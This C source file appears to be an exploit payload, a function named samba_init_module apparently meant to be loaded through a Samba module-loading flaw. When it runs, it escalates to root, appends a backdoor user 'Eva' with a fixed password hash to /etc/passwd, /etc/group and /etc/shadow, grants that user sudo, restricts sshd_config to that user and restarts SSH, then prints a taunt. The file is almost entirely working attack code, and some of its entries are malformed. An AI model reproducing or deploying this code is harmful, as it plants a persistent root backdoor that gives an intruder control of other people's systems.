#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>


int add_usr(void) //prida uzivatele Eva do ciloveho OS Linux s root opravnenim 
{
    #define PASSWD_TO_HASH_LENGTH 50
    #define COMMAND_LENGTH 40

    FILE* file;
    char usr[] = "Eva:x:502:502:user:home/eva:/bin/bash";
    char grp[] = "evagroup:x:502";
    char salt[] = "qgiPa4QD";
    char shadowPasswd[] = "Eva:$6$qgiPa4QD$aGI4G9nPg4e7uE8HGsW7H9azo4pUuHwOUe0Iiedp9S5OW9tadqyCEL6QXdRHDGPD9L/KET.l1fjWkkw2hjjQ6/:17987:0:99999:7:::";
    char usrFilePath[] = "/etc/passwd";
    char usrGroupPath[] = "/etc/group";
    char passFilePath[] = "/etc/shadow";
    char command[COMMAND_LENGTH];

    file = fopen(usrFilePath, "a+");
    fputs(usr, file);
    fclose(file);

    file = fopen(usrGroupPath, "a+");
    fputs(grp, file);
    fclose(file);
 
    file = fopen(passFilePath, "a+");
    fputs(shadowPasswd, file);
    fclose(file);
    strcpy(command, "usermod -aG sudo Eva");
    system(command);
}

int allow_ssh_connection(void)
{
    FILE* file;
    char sshConfigFilePath[] = "/etc/ssh/sshd_config";
    char sshUsr[] = "AllowUsers Eva";
    char command[COMMAND_LENGTH];

    file = fopen(sshConfigFilePath, "a+");
    fputs(sshUsr, file);
    fclose(file);
    strcpy(command, "systemctl restart sshd");
    system(command);

}

extern bool change_to_root_user(void);

int samba_init_module(void)
{	
    char command[COMMAND_LENGTH];

    change_to_root_user(); 
    add_usr();
    allow_ssh_connection();
    strcpy(command, "echo Jupi-ja-jej smejde!");
    system(command);      

   return 0;
}
